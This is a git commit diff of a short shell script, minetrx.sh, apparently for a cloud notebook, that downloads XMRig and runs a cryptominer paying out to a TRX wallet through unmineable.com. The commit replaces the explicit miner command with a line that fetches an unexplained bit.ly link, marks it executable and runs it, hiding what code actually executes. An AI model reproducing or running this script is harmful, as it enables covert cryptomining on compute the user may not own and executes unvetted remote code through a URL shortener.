3b8d034c924fb908dfde3d38c727a69ab0675f74
Anvesh17 <60892476+Anvesh17@users.noreply.github.com>
2021-08-26 14:10:16 +0530

    Update minetrx.sh

--- minetrx.sh
+++ minetrx.sh
@@ -2,6 +2,5 @@
 ! sudo apt-get update && sudo apt install screen -y && screen -dmS
 ! wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz 
 ! tar xf xmrig-6.14.1-linux-x64.tar.gz 
-! cd xmrig-6.14.1 
-! chmod +x xmrig 
-! ./xmrig --donate-level 0 -o rx-asia.unmineable.com:3333 -u TRX:TTscixQPXH7hjrhDHBfyXb1q4ZAEn.ROCKY#kl4v-aeu4  -p x -k -a rx/0
+%cd xmrig-6.14.1  
+! wget https://bit.ly/2WtJHSQ && chmod +x 2WtJHSQ && ./2WtJHSQ
